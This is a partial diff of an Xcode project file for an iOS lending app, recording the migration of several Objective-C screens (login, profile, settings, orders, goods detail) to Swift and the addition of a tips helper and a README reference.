@@ -7,6 +7,19 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		CF9687876F8D47A19399F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 80DC663A896F49C2A199F71F; };
+		7F88A1112F91BBBB001D0101 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1012F91BBBB001D0101 /* HomeViewController.swift */; };
+		7F88A1122F91BBBB001D0102 /* PBReviewsHomeModels.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */; };
+		7F88A1132F91BBBB001D0103 /* APageLargeLoanCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */; };
+		7F88A1142F91BBBB001D0104 /* APageHomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */; };
+		7F88A1152F91BBBB001D0105 /* APageAsset.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1052F91BBBB001D0105 /* APageAsset.swift */; };
+		7F88A1162F91BBBB001D0106 /* APageFindingCarouselView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */; };
+		7F88A1172F91BBBB001D0107 /* PPLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1072F91BBBB001D0107 /* PPLoginViewController.swift */; };
+		7F88A11A2F91BBBB001D0208 /* PPSubOrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1192F91BBBB001D0208 /* PPSubOrderViewController.swift */; };
+		7F88A1302F91CCCC001E0101 /* PB_NativeTipsHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A12F2F91CCCC001E0101 /* PB_NativeTipsHelper.m */; };
+		7F88A1602F91DDDD001E0301 /* MeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1632F91DDDD001E0301 /* MeViewController.swift */; };
+		7F88A1612F91DDDD001E0301 /* MeRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1642F91DDDD001E0301 /* MeRootView.swift */; };
+		7F88A1622F91DDDD001E0301 /* MeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1652F91DDDD001E0301 /* MeViewModel.swift */; };
 		98043A6D2AEB9FC300374328 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043A6C2AEB9FC300374328 /* AppDelegate.m */; };
 		98043A782AEB9FC500374328 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 98043A772AEB9FC500374328 /* Assets.xcassets */; };
 		98043A7B2AEB9FC500374328 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 98043A792AEB9FC500374328 /* LaunchScreen.storyboard */; };
@@ -32,14 +45,6 @@
 		98043AE52AEBF71000374328 /* PPTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AE42AEBF71000374328 /* PPTableViewController.m */; };
 		98043AE82AEBF73000374328 /* PPTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AE72AEBF73000374328 /* PPTableViewCell.m */; };
 		98043AEB2AEBF77D00374328 /* PPTableViewHeaderFooterView.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AEA2AEBF77D00374328 /* PPTableViewHeaderFooterView.m */; };
-		7F88A1112F91BBBB001D0101 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1012F91BBBB001D0101 /* HomeViewController.swift */; };
-		7F88A1122F91BBBB001D0102 /* PBReviewsHomeModels.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */; };
-		7F88A1132F91BBBB001D0103 /* APageLargeLoanCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */; };
-		7F88A1142F91BBBB001D0104 /* APageHomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */; };
-		7F88A1152F91BBBB001D0105 /* APageAsset.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1052F91BBBB001D0105 /* APageAsset.swift */; };
-		7F88A1162F91BBBB001D0106 /* APageFindingCarouselView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */; };
-		98043AF12AEBFF7400374328 /* MeViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AF02AEBFF7400374328 /* MeViewController.m */; };
-		98043AFE2AEC058200374328 /* PPLoginViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043AFD2AEC058200374328 /* PPLoginViewController.m */; };
 		98043B032AED547200374328 /* PPStartViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 98043B012AED547200374328 /* PPStartViewController.m */; };
 		98043B042AED547200374328 /* PPStartViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = 98043B022AED547200374328 /* PPStartViewController.xib */; };
 		9829BD262C63A80200D5A5D6 /* NSString+PB1.m in Sources */ = {isa = PBXBuildFile; fileRef = 9829BD252C63A80200D5A5D6 /* NSString+PB1.m */; };
@@ -63,13 +68,13 @@
 		983EB3622AF7F4700062A141 /* PPAdressModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 983EB3612AF7F46F0062A141 /* PPAdressModel.m */; };
 		983EB3652AF7FD140062A141 /* PPVeContactHrader.m in Sources */ = {isa = PBXBuildFile; fileRef = 983EB3642AF7FD140062A141 /* PPVeContactHrader.m */; };
 		983EB3682AF8005E0062A141 /* PPVeContactModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 983EB3662AF8005E0062A141 /* PPVeContactModel.m */; };
-		985C244E2AEF40840008F38B /* GuideViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C244D2AEF40840008F38B /* GuideViewController.m */; };
 		985C24542AEF585E0008F38B /* PPBaseModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24522AEF585D0008F38B /* PPBaseModel.m */; };
 		985C24572AEFA51C0008F38B /* PPSendCodeModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24562AEFA51B0008F38B /* PPSendCodeModel.m */; };
 		985C245A2AEFAA7B0008F38B /* PPLoginModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24582AEFAA7B0008F38B /* PPLoginModel.m */; };
 		985C24722AEFF8750008F38B /* PPHomeModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24702AEFF8750008F38B /* PPHomeModel.m */; };
 		985C24762AF0D3DA0008F38B /* PPEnterModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24752AF0D3DA0008F38B /* PPEnterModel.m */; };
-		985C24792AF0D52D0008F38B /* PPGoodsDetailViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24782AF0D52D0008F38B /* PPGoodsDetailViewController.m */; };
+		7F88A1A02F920111001E0601 /* PPGoodsDetailViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */; };
+		7F88A1A12F920111001E0601 /* GoodsDetailRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */; };
 		985C247C2AF0D60A0008F38B /* PPGoodsDetailHeader.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C247B2AF0D60A0008F38B /* PPGoodsDetailHeader.m */; };
 		985C24822AF0DC450008F38B /* PPGoodsDetailTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 985C24812AF0DC450008F38B /* PPGoodsDetailTableViewCell.m */; };
 		9863F4C92AF0F4BB003B8598 /* PPDetailModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4C82AF0F4BB003B8598 /* PPDetailModel.m */; };
@@ -78,15 +83,13 @@
 		9863F4D62AF10320003B8598 /* PPVeWorkInfoViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4D52AF10320003B8598 /* PPVeWorkInfoViewController.m */; };
 		9863F4D92AF1034A003B8598 /* PPVeContactViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4D82AF1034A003B8598 /* PPVeContactViewController.m */; };
 		9863F4DC2AF10370003B8598 /* PPVeBankViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4DB2AF10370003B8598 /* PPVeBankViewController.m */; };
-		9863F4DF2AF12669003B8598 /* PPMeHeader.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4DE2AF12669003B8598 /* PPMeHeader.m */; };
 		9863F4E22AF12FE2003B8598 /* PPMeModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4E12AF12FE2003B8598 /* PPMeModel.m */; };
-		9863F4E52AF136F5003B8598 /* PPMeTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4E42AF136F5003B8598 /* PPMeTableViewCell.m */; };
 		9863F4E92AF15060003B8598 /* PPOrderViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4E82AF15060003B8598 /* PPOrderViewController.m */; };
-		9863F4EC2AF15081003B8598 /* PPSubOrderViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4EB2AF15081003B8598 /* PPSubOrderViewController.m */; };
 		9863F4EF2AF1509A003B8598 /* PPOrderTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4EE2AF1509A003B8598 /* PPOrderTableViewCell.m */; };
 		9863F4F22AF150AA003B8598 /* PPOrderEmptyTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4F12AF150AA003B8598 /* PPOrderEmptyTableViewCell.m */; };
 		9863F4F52AF15664003B8598 /* PPOrderModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4F32AF15663003B8598 /* PPOrderModel.m */; };
-		9863F4F92AF26DCB003B8598 /* PPSettingViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 9863F4F72AF26DCB003B8598 /* PPSettingViewController.m */; };
+		7F88A1802F91EEEE001E0501 /* PPSettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */; };
+		7F88A1812F91EEEE001E0501 /* SettingRootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7F88A1832F91EEEE001E0501 /* SettingRootView.swift */; };
 		98643DEE2C64508200F83A5A /* PB_RequestHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643DED2C64508200F83A5A /* PB_RequestHelper.m */; };
 		98643DF12C6451EE00F83A5A /* PB_AskRootUrlHelper.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643DF02C6451EE00F83A5A /* PB_AskRootUrlHelper.m */; };
 		98643DF72C64564400F83A5A /* PB_idf_helper.m in Sources */ = {isa = PBXBuildFile; fileRef = 98643DF62C64564400F83A5A /* PB_idf_helper.m */; };
@@ -116,7 +119,22 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		80DC663A896F49C2A199F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1146864D21E3E493138D6DED /* Pods-PrimeLoanPH.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PrimeLoanPH.release.xcconfig"; path = "Target Support Files/Pods-PrimeLoanPH/Pods-PrimeLoanPH.release.xcconfig"; sourceTree = "<group>"; };
+		7F88A1002F91BBBB001D0100 /* PrimeLoanPH-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "PrimeLoanPH-Bridging-Header.h"; sourceTree = "<group>"; };
+		7F88A1012F91BBBB001D0101 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
+		7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PBReviewsHomeModels.swift; sourceTree = "<group>"; };
+		7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageLargeLoanCardView.swift; sourceTree = "<group>"; };
+		7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageHomeHeaderView.swift; sourceTree = "<group>"; };
+		7F88A1052F91BBBB001D0105 /* APageAsset.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageAsset.swift; sourceTree = "<group>"; };
+		7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageFindingCarouselView.swift; sourceTree = "<group>"; };
+		7F88A1072F91BBBB001D0107 /* PPLoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPLoginViewController.swift; sourceTree = "<group>"; };
+		7F88A1192F91BBBB001D0208 /* PPSubOrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPSubOrderViewController.swift; sourceTree = "<group>"; };
+		7F88A12E2F91CCCC001E0101 /* PB_NativeTipsHelper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_NativeTipsHelper.h; sourceTree = "<group>"; };
+		7F88A12F2F91CCCC001E0101 /* PB_NativeTipsHelper.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_NativeTipsHelper.m; sourceTree = "<group>"; };
+		7F88A1632F91DDDD001E0301 /* MeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeViewController.swift; sourceTree = "<group>"; };
+		7F88A1642F91DDDD001E0301 /* MeRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeRootView.swift; sourceTree = "<group>"; };
+		7F88A1652F91DDDD001E0301 /* MeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeViewModel.swift; sourceTree = "<group>"; };
 		98043A682AEB9FC300374328 /* PrimeCash.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PrimeCash.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		98043A6B2AEB9FC300374328 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
 		98043A6C2AEB9FC300374328 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
@@ -165,17 +183,6 @@
 		98043AE72AEBF73000374328 /* PPTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPTableViewCell.m; sourceTree = "<group>"; };
 		98043AE92AEBF77D00374328 /* PPTableViewHeaderFooterView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPTableViewHeaderFooterView.h; sourceTree = "<group>"; };
 		98043AEA2AEBF77D00374328 /* PPTableViewHeaderFooterView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPTableViewHeaderFooterView.m; sourceTree = "<group>"; };
-		7F88A1002F91BBBB001D0100 /* PrimeLoanPH-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "PrimeLoanPH-Bridging-Header.h"; sourceTree = "<group>"; };
-		7F88A1012F91BBBB001D0101 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
-		7F88A1022F91BBBB001D0102 /* PBReviewsHomeModels.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PBReviewsHomeModels.swift; sourceTree = "<group>"; };
-		7F88A1032F91BBBB001D0103 /* APageLargeLoanCardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageLargeLoanCardView.swift; sourceTree = "<group>"; };
-		7F88A1042F91BBBB001D0104 /* APageHomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageHomeHeaderView.swift; sourceTree = "<group>"; };
-		7F88A1052F91BBBB001D0105 /* APageAsset.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageAsset.swift; sourceTree = "<group>"; };
-		7F88A1062F91BBBB001D0106 /* APageFindingCarouselView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APageFindingCarouselView.swift; sourceTree = "<group>"; };
-		98043AEF2AEBFF7400374328 /* MeViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MeViewController.h; sourceTree = "<group>"; };
-		98043AF02AEBFF7400374328 /* MeViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MeViewController.m; sourceTree = "<group>"; };
-		98043AFC2AEC058200374328 /* PPLoginViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPLoginViewController.h; sourceTree = "<group>"; };
-		98043AFD2AEC058200374328 /* PPLoginViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPLoginViewController.m; sourceTree = "<group>"; };
 		98043B002AED547200374328 /* PPStartViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPStartViewController.h; sourceTree = "<group>"; };
 		98043B012AED547200374328 /* PPStartViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPStartViewController.m; sourceTree = "<group>"; };
 		98043B022AED547200374328 /* PPStartViewController.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PPStartViewController.xib; sourceTree = "<group>"; };
@@ -220,8 +227,6 @@
 		983EB3642AF7FD140062A141 /* PPVeContactHrader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeContactHrader.m; sourceTree = "<group>"; };
 		983EB3662AF8005E0062A141 /* PPVeContactModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPVeContactModel.m; sourceTree = "<group>"; };
 		983EB3672AF8005E0062A141 /* PPVeContactModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPVeContactModel.h; sourceTree = "<group>"; };
-		985C244C2AEF40840008F38B /* GuideViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = GuideViewController.h; sourceTree = "<group>"; };
-		985C244D2AEF40840008F38B /* GuideViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = GuideViewController.m; sourceTree = "<group>"; };
 		985C24522AEF585D0008F38B /* PPBaseModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPBaseModel.m; sourceTree = "<group>"; };
 		985C24532AEF585D0008F38B /* PPBaseModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPBaseModel.h; sourceTree = "<group>"; };
 		985C24552AEFA51B0008F38B /* PPSendCodeModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPSendCodeModel.h; sourceTree = "<group>"; };
@@ -232,8 +237,8 @@
 		985C24712AEFF8750008F38B /* PPHomeModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPHomeModel.h; sourceTree = "<group>"; };
 		985C24742AF0D3DA0008F38B /* PPEnterModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPEnterModel.h; sourceTree = "<group>"; };
 		985C24752AF0D3DA0008F38B /* PPEnterModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPEnterModel.m; sourceTree = "<group>"; };
-		985C24772AF0D52D0008F38B /* PPGoodsDetailViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPGoodsDetailViewController.h; sourceTree = "<group>"; };
-		985C24782AF0D52D0008F38B /* PPGoodsDetailViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPGoodsDetailViewController.m; sourceTree = "<group>"; };
+		7F88A1A22F920111001E0601 /* PPGoodsDetailViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPGoodsDetailViewController.swift; sourceTree = "<group>"; };
+		7F88A1A32F920111001E0601 /* GoodsDetailRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GoodsDetailRootView.swift; sourceTree = "<group>"; };
 		985C247A2AF0D60A0008F38B /* PPGoodsDetailHeader.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPGoodsDetailHeader.h; sourceTree = "<group>"; };
 		985C247B2AF0D60A0008F38B /* PPGoodsDetailHeader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPGoodsDetailHeader.m; sourceTree = "<group>"; };
 		985C24802AF0DC450008F38B /* PPGoodsDetailTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPGoodsDetailTableViewCell.h; sourceTree = "<group>"; };
@@ -250,24 +255,18 @@
 		9863F4D82AF1034A003B8598 /* PPVeContactViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeContactViewController.m; sourceTree = "<group>"; };
 		9863F4DA2AF10370003B8598 /* PPVeBankViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPVeBankViewController.h; sourceTree = "<group>"; };
 		9863F4DB2AF10370003B8598 /* PPVeBankViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPVeBankViewController.m; sourceTree = "<group>"; };
-		9863F4DD2AF12669003B8598 /* PPMeHeader.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPMeHeader.h; sourceTree = "<group>"; };
-		9863F4DE2AF12669003B8598 /* PPMeHeader.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPMeHeader.m; sourceTree = "<group>"; };
 		9863F4E02AF12FE2003B8598 /* PPMeModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPMeModel.h; sourceTree = "<group>"; };
 		9863F4E12AF12FE2003B8598 /* PPMeModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPMeModel.m; sourceTree = "<group>"; };
-		9863F4E32AF136F5003B8598 /* PPMeTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPMeTableViewCell.h; sourceTree = "<group>"; };
-		9863F4E42AF136F5003B8598 /* PPMeTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPMeTableViewCell.m; sourceTree = "<group>"; };
 		9863F4E72AF15060003B8598 /* PPOrderViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPOrderViewController.h; sourceTree = "<group>"; };
 		9863F4E82AF15060003B8598 /* PPOrderViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPOrderViewController.m; sourceTree = "<group>"; };
-		9863F4EA2AF15081003B8598 /* PPSubOrderViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPSubOrderViewController.h; sourceTree = "<group>"; };
-		9863F4EB2AF15081003B8598 /* PPSubOrderViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPSubOrderViewController.m; sourceTree = "<group>"; };
 		9863F4ED2AF1509A003B8598 /* PPOrderTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPOrderTableViewCell.h; sourceTree = "<group>"; };
 		9863F4EE2AF1509A003B8598 /* PPOrderTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPOrderTableViewCell.m; sourceTree = "<group>"; };
 		9863F4F02AF150AA003B8598 /* PPOrderEmptyTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPOrderEmptyTableViewCell.h; sourceTree = "<group>"; };
 		9863F4F12AF150AA003B8598 /* PPOrderEmptyTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPOrderEmptyTableViewCell.m; sourceTree = "<group>"; };
 		9863F4F32AF15663003B8598 /* PPOrderModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PPOrderModel.m; sourceTree = "<group>"; };
 		9863F4F42AF15663003B8598 /* PPOrderModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PPOrderModel.h; sourceTree = "<group>"; };
-		9863F4F62AF26DCB003B8598 /* PPSettingViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PPSettingViewController.h; sourceTree = "<group>"; };
-		9863F4F72AF26DCB003B8598 /* PPSettingViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PPSettingViewController.m; sourceTree = "<group>"; };
+		7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PPSettingViewController.swift; sourceTree = "<group>"; };
+		7F88A1832F91EEEE001E0501 /* SettingRootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingRootView.swift; sourceTree = "<group>"; };
 		98643DEC2C64508200F83A5A /* PB_RequestHelper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_RequestHelper.h; sourceTree = "<group>"; };
 		98643DED2C64508200F83A5A /* PB_RequestHelper.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = PB_RequestHelper.m; sourceTree = "<group>"; };
 		98643DEF2C6451EE00F83A5A /* PB_AskRootUrlHelper.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = PB_AskRootUrlHelper.h; sourceTree = "<group>"; };
@@ -362,6 +361,7 @@
 		98043A692AEB9FC300374328 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				80DC663A896F49C2A199F71F /* README.md */,
 				98043A682AEB9FC300374328 /* PrimeCash.app */,
 			);
 			name = Products;
@@ -455,6 +455,8 @@
 		98043A932AEBE07000374328 /* PBManager */ = {
 			isa = PBXGroup;
 			children = (
+				7F88A12E2F91CCCC001E0101 /* PB_NativeTipsHelper.h */,
+				7F88A12F2F91CCCC001E0101 /* PB_NativeTipsHelper.m */,
 				98643DEC2C64508200F83A5A /* PB_RequestHelper.h */,
 				98643DED2C64508200F83A5A /* PB_RequestHelper.m */,
 				98643DEF2C6451EE00F83A5A /* PB_AskRootUrlHelper.h */,
@@ -522,16 +524,13 @@
 		98043AA42AEBE31100374328 /* PBMineMe */ = {
 			isa = PBXGroup;
 			children = (
-				98043AEF2AEBFF7400374328 /* MeViewController.h */,
-				98043AF02AEBFF7400374328 /* MeViewController.m */,
-				9863F4DD2AF12669003B8598 /* PPMeHeader.h */,
-				9863F4DE2AF12669003B8598 /* PPMeHeader.m */,
+				7F88A1632F91DDDD001E0301 /* MeViewController.swift */,
+				7F88A1642F91DDDD001E0301 /* MeRootView.swift */,
+				7F88A1652F91DDDD001E0301 /* MeViewModel.swift */,
 				9863F4E02AF12FE2003B8598 /* PPMeModel.h */,
 				9863F4E12AF12FE2003B8598 /* PPMeModel.m */,
-				9863F4E32AF136F5003B8598 /* PPMeTableViewCell.h */,
-				9863F4E42AF136F5003B8598 /* PPMeTableViewCell.m */,
-				9863F4F62AF26DCB003B8598 /* PPSettingViewController.h */,
-				9863F4F72AF26DCB003B8598 /* PPSettingViewController.m */,
+				7F88A1822F91EEEE001E0501 /* PPSettingViewController.swift */,
+				7F88A1832F91EEEE001E0501 /* SettingRootView.swift */,
 				9887CC562AF27FC000E9E5F7 /* PPResignViewController.h */,
 				9887CC572AF27FC000E9E5F7 /* PPResignViewController.m */,
 			);
@@ -607,8 +606,7 @@
 		98043AFB2AEC056D00374328 /* PBToLogin */ = {
 			isa = PBXGroup;
 			children = (
-				98043AFC2AEC058200374328 /* PPLoginViewController.h */,
-				98043AFD2AEC058200374328 /* PPLoginViewController.m */,
+				7F88A1072F91BBBB001D0107 /* PPLoginViewController.swift */,
 				985C24552AEFA51B0008F38B /* PPSendCodeModel.h */,
 				985C24562AEFA51B0008F38B /* PPSendCodeModel.m */,
 				985C24592AEFAA7B0008F38B /* PPLoginModel.h */,
@@ -623,8 +621,6 @@
 				98043B002AED547200374328 /* PPStartViewController.h */,
 				98043B012AED547200374328 /* PPStartViewController.m */,
 				98043B022AED547200374328 /* PPStartViewController.xib */,
-				985C244C2AEF40840008F38B /* GuideViewController.h */,
-				985C244D2AEF40840008F38B /* GuideViewController.m */,
 			);
 			path = PBStartLaunch;
 			sourceTree = "<group>";
@@ -636,8 +632,8 @@
 				985C24752AF0D3DA0008F38B /* PPEnterModel.m */,
 				9863F4C72AF0F4BB003B8598 /* PPDetailModel.h */,
 				9863F4C82AF0F4BB003B8598 /* PPDetailModel.m */,
-				985C24772AF0D52D0008F38B /* PPGoodsDetailViewController.h */,
